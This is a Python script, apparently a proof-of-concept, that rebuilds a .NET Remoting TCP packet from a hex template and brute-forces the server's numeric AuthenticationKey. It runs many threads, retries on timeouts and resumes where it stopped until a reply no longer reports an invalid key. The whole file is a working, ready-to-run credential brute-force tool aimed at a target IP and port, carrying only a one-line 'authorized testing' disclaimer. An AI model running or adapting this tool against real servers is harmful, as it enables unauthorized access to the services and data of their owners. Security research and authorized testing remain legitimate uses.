import socket
import argparse
import threading
import queue
import time
import random
from datetime import datetime

# Pre-computed static data - parsed once at module load
_TEMPLATE = bytes.fromhex(
    "2e4e4554010000000000e5010000040001012a0000007463703a2f2f3139322e"
    "3136382e3136322e3137373a31303030342f50726f6f664f66436f6e63657074"
    "06000101180000006170706c69636174696f6e2f6f637465742d73747265616d"
    "0100011100000041757468656e7469636174696f6e4b65790109000000343030"
    "35343838363800000001000000ffffffff010000000000000004010000002c53"
    "797374656d2e52756e74696d652e52656d6f74696e672e4d6573736167696e67"
    "2e4d6574686f6443616c6c06000000055f5f5572690c5f5f4d6574686f644e61"
    "6d65115f5f4d6574686f645369676e6174757265065f5f417267730a5f5f5479"
    "70654e616d650d5f5f43616c6c436f6e746578740101030501030d5379737465"
    "6d2e547970655b5d3453797374656d2e52756e74696d652e52656d6f74696e67"
    "2e4d6573736167696e672e4c6f676963616c43616c6c436f6e74657874060200"
    "00002a7463703a2f2f3139322e3136382e3136322e3137373a31303030342f50"
    "726f6f664f66436f6e63657074060300000008546f537472696e670904000000"
    "090500000006060000005a53797374656d2e4f626a6563742c206d73636f726c"
    "69622c2056657273696f6e3d342e302e302e302c2043756c747572653d6e6575"
    "7472616c2c205075626c69634b6579546f6b656e3d6237376135633536313933"
    "346530383909070000000704000000000100000000000000030b53797374656d"
    "2e5479706510050000000000000004070000003453797374656d2e52756e7469"
    "6d652e52656d6f74696e672e4d6573736167696e672e4c6f676963616c43616c"
    "6c436f6e74657874000000000b"        
)

# Pre-computed static chunks
_P_CHUNK1 = _TEMPLATE[0x0:0xA]
_P_CHUNK2 = _TEMPLATE[0xE:0x12]
_P_CHUNK3 = _TEMPLATE[0x40:0x79]
_P_CHUNK4 = _TEMPLATE[0x88:0x15f]
_P_CHUNK5 = _TEMPLATE[0x18d:]
current_key = None
possible_key = None

# Pre-computed constants
_ORIGINAL_CONTENT_LEN = int.from_bytes(_TEMPLATE[0xA:0xE], 'little')
_ORIGINAL_URI_LEN = 42  # len("tcp://192.168.162.177:10004/ProofOfConcept")
_URI_PREFIX = b"tcp://"
_URI_SUFFIX = b":10004/ProofOfConcept"
_PADDING = b'\x00\x00'

class PacketBuilder:
    """Optimized packet builder that pre-computes IP-specific values."""
    
    def __init__(self, new_ip: str):
        self.new_ip = new_ip
        # Pre-compute IP-specific values
        self.new_uri_str = f"tcp://{new_ip}:10004/ProofOfConcept"
        self.new_uri_bytes = self.new_uri_str.encode()
        self.delta_uri = len(self.new_uri_bytes) - _ORIGINAL_URI_LEN
        self.new_content_len = _ORIGINAL_CONTENT_LEN + self.delta_uri
        self.new_content_len_bytes = self.new_content_len.to_bytes(4, 'little')
        self.new_uri_len_bytes = len(self.new_uri_bytes).to_bytes(4, 'little')
        self.new_uri_len_bytes_big = len(self.new_uri_bytes).to_bytes(4, 'big')
    
    def create_packet(self, new_auth_key: int):
        """Create packet with optimized operations for the given auth key."""
        # Convert auth key to bytes (only variable operation per call)
        new_auth_key_bytes = str(new_auth_key).encode()
        new_auth_key_len_bytes = len(new_auth_key_bytes).to_bytes(4, 'little')
        
        # Assemble packets using pre-computed values
        final_packet1 = _P_CHUNK1 + self.new_content_len_bytes + _P_CHUNK2 + \
                       self.new_uri_len_bytes + self.new_uri_bytes + _P_CHUNK3 + \
                       new_auth_key_len_bytes + new_auth_key_bytes + _PADDING
        
        final_packet2 = _P_CHUNK4 + self.new_uri_len_bytes_big + self.new_uri_bytes + _P_CHUNK5
        
        return final_packet1, final_packet2

def create_remoting_packet(new_ip: str, new_auth_key: int) -> bytes:
    """
    Reconstructs a .NET Remoting packet from scratch to handle variable-length
    IP addresses and Authentication Keys.

    Args:
        new_ip: The new IP address to insert into the URI.
        new_auth_key: The new AuthenticationKey value.

    Returns:
        A bytes object containing the complete, patched packet.
    """
    # For backward compatibility, create a temporary builder
    builder = PacketBuilder(new_ip)
    return builder.create_packet(new_auth_key)

def packet_builder_thread(patch_ip, start_range, end_range, packet_queue, stop_event):
    """Thread function to build packets and put them in the queue."""
    # Create optimized packet builder once for this IP
    builder = PacketBuilder(patch_ip)
    
    for i in range(start_range, end_range):
        if stop_event.is_set():
            break
        
        try:
            final_packet1, final_packet2 = builder.create_packet(i)
            # Use timeout on put to avoid blocking if queue is full and senders stopped
            packet_queue.put((i, final_packet1, final_packet2), timeout=1)
        except queue.Full:
            # Queue is full and senders might have stopped, check stop_event
            if stop_event.is_set():
                break
            continue
    
    # Signal end of packets (only if we completed normally)
    try:
        packet_queue.put(None, timeout=1)
    except queue.Full:
        pass  # Senders already stopped, no need to signal

def packet_sender_thread(target_ip, target_port, packet_queue, stop_event, start_range, start_time, thread_id):
    """Thread function to send packets and handle responses."""
    max_retries = 20
    retry_count = 0
    global current_key
    global possible_key
    
    while retry_count < max_retries and not stop_event.is_set():
        timeout = False
        try:
            # Each thread gets its own socket connection
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                # Optimize socket settings for high throughput
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)  # Disable Nagle's algorithm
                s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)  # Increase send buffer
                s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 65536)  # Increase receive buffer
                s.settimeout(5)  # Reduced timeout for faster failure detection
                
                print(f"Thread {thread_id}: Connecting to {target_ip}:{target_port}...")
                s.connect((target_ip, target_port))
                print(f"Thread {thread_id}: Connected successfully")
                
                # Reset retry count on successful connection
                retry_count = 0
                
                while not stop_event.is_set():
                    try:
                        # Get packet from queue with timeout
                        packet_data = packet_queue.get(timeout=1)
                        
                        if packet_data is None:  # End signal
                            break
                            
                        i, final_packet1, final_packet2 = packet_data
                        
                        # Send both packets at once for better efficiency
                        combined_packet = final_packet1 + final_packet2
                        s.sendall(combined_packet)
                        
                        # Read response header
                        ret = recv_bytes(s, 16)
                        ret_size = int.from_bytes(ret[10:14], 'little')
                        
                        if ret_size > 0:
                            ret = recv_bytes(s, ret_size)

                            if b'Invalid authentication key' in ret:
                                # Progress update every 10000 requests
                                if (i - start_range) % 10000 == 0 and i > start_range:
                                    elapsed = time.time() - start_time
                                    requests_sent = i - start_range
                                    rps = requests_sent / elapsed if elapsed > 0 else 0
                                    current_time = datetime.now().strftime("%H:%M:%S")
                                    current_key = start_range + requests_sent
                                    print(f"[{current_time}] Progress: Testing key {current_key:,} ({requests_sent:,} requests sent, {rps:.2f} requests/sec)")
                            else:
                                possible_key = i
                                print(f"Thread {thread_id}: {ret}")
                                print(f"Thread {thread_id}: Possible key: {i}")
                                stop_event.set()  # Signal to stop all threads
                                break
                                
                    except queue.Empty:
                        continue
                    except socket.timeout:
                        print(f"Thread {thread_id}: Connection timed out")
                        time.sleep(5)
                        timeout = True
                        break
                    except Exception as e:
                        print(f"Error in sender thread {thread_id}: {e}")
                        stop_event.set()
                        break
                
                # If we get here, the thread completed successfully
                if timeout == False:
                    break

        except socket.timeout:
            retry_count += 1
            if retry_count < max_retries:
                sleep_time = random.randint(1, 10)
                print(f"Thread {thread_id}: Retrying connection in {sleep_time} seconds...")
                time.sleep(sleep_time)
                print(f"Thread {thread_id}: Connection timeout (attempt {retry_count}/{max_retries})")
            else:
                print(f"Thread {thread_id}: Max retries reached, giving up")
                stop_event.set()
                break
        except Exception as e:
            print(f"Connection error in thread {thread_id}: {e}")
            stop_event.set()
            break

    print(f"Thread {thread_id}: Sender thread completed.")

def recv_bytes(sock, size):
    data = b""
    while len(data) < size:
        packet = sock.recv(size - len(data))
        if not packet:
            break
        data += packet
    return data

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Send a custom .NET Remoting TCP packet with variable-length IP and AuthKey.",
        epilog="Disclaimer: This script is for educational and authorized testing purposes only.",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("target_ip", help="The IP address of the target .NET Remoting server.")
    parser.add_argument("target_port", type=int, help="The port of the target server.")
    parser.add_argument("start_key", type=int, help="The starting value for the AuthenticationKey brute force (e.g., 400540000).")
    parser.add_argument("--end_key", type=int, help="The ending value for the AuthenticationKey brute force (default: max 32-bit int).")
    parser.add_argument("--threads", type=int, default=3, help="Number of sender threads to use (default: 3).")

    args = parser.parse_args()

    try:
        start_time = time.time()
        start_range = args.start_key
        end_range = args.end_key if args.end_key is not None else 2**31 - 1  # Default to max 32-bit signed integer
        
        # Validate range

        while True:
            if end_range <= start_range:
                print(f"❌ Error: End key ({end_range}) must be greater than start key ({start_range})")
                exit(1)
            
            print(f"Starting brute force from {start_range:,} to {end_range:,}")
            print(f"Total range: {end_range - start_range:,} authentication keys to test")
            
            # Create queue and stop event for thread communication
            packet_queue = queue.Queue(maxsize=1000)  # Smaller queue for better responsiveness
            stop_event = threading.Event()
            
            # Create multiple sender threads for higher throughput
            num_sender_threads = args.threads
            sender_threads = []
            
            print(f"Using {num_sender_threads} sender threads")
            
            # Create and start builder thread
            builder_thread = threading.Thread(
                target=packet_builder_thread,
                args=(args.target_ip, start_range, end_range, packet_queue, stop_event)
            )
            
            # Create multiple sender threads, each with its own connection
            for i in range(num_sender_threads):
                sender_thread = threading.Thread(
                    target=packet_sender_thread,
                    args=(args.target_ip, args.target_port, packet_queue, stop_event, start_range, start_time, i+1)
                )
                sender_threads.append(sender_thread)
            
            print(f"Starting packet builder and {num_sender_threads} sender threads...")
            builder_thread.start()
            for thread in sender_threads:
                thread.start()
            
            # Wait for sender threads to complete
            for thread in sender_threads:
                thread.join()
            
            # Signal builder thread to stop and wait for it
            stop_event.set()
            builder_thread.join(timeout=5)  # Wait max 5 seconds for builder to stop
            
            if builder_thread.is_alive():
                print("Warning: Builder thread did not stop gracefully")
            
            print("All threads completed.")

            if possible_key is not None:
                break

            time.sleep(120)
            start_range = current_key

    except (ValueError, RuntimeError, socket.error) as e:
        print(f"\n❌ An error occurred: {e}")
